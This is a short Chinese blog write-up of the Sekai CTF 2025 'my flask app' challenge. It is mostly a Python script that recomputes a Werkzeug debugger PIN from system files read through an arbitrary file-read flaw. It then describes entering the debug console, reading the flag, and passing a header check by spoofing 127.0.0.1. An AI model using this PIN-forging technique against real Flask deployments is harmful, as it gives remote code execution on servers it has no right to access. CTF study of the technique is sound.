---
layout: post
title: sekai CTF 2025复现
tag: CTF
---

## 1.my flask app

解pin脚本如下：

```python
import hashlib
from itertools import chain

# =================================================================
# 1. 只需要修改这里面的变量
# =================================================================

# [信息来源 1]: 读取 /etc/passwd
# 查看运行该 app 的用户名 (例如: flask, www-data, root)
username = "flask" 

# [信息来源 2]: 读取 /sys/class/net/eth0/address
# 获取 MAC 地址并转换为十进制整数
# 示例: 02:42:ac:11:00:02 -> int("0242ac110002", 16) -> 2485377892354
mac_address_str = "02:42:ac:11:00:02" # 填入读取到的 MAC
mac_address_int = int(mac_address_str.replace(":", ""), 16)

# [信息来源 3]: 组合 machine-id
# Docker 环境通常由两部分组成: 
# part1: 读取 /etc/machine-id (如果读不到试 /proc/sys/kernel/random/boot_id)
# part2: 读取 /proc/self/cgroup，找第一行斜杠后面的部分
# 示例 machine_id = "d48..." + "470..." (拼接起来)
machine_id = "xxxxxxxxxxxxxxxxxxxxxxxx" 

# [信息来源 4]: Flask 库的绝对路径
# 通常是: /usr/local/lib/python{版本}/site-packages/flask/app.py
# 如果不知道 Python 版本，可以通过报错或者读取 /proc/self/environ猜测
flask_app_path = "/usr/local/lib/python3.8/site-packages/flask/app.py"

# =================================================================
# 2. 下面的逻辑通常不需要动 (这是 Werkzeug 生成 PIN 的源码逻辑)
# =================================================================

probably_public_bits = [
    username,
    'flask.app',       # modname (通常不变)
    'Flask',           # getattr(app, '__name__', getattr(app.__class__, '__name__')) (通常不变)
    flask_app_path     # getattr(mod, '__file__', None)
]

private_bits = [
    str(mac_address_int),
    machine_id
]

# 尝试不同的哈希算法 (Werkzeug 1.0 之前用 md5，之后用 sha1)
# 大多数现代 CTF 题目使用的是 sha1
h = hashlib.sha1() 
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
    h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(f"[*] Calculated PIN: {rv}")
```

很贴心地给了任意文件读取，直接读加密代码，直接解就行。

进console后直接`ls`再`cat`拿到flag。

> 这里直接进console会报400，但是改http头127.0.0.1就能过，不知道为什么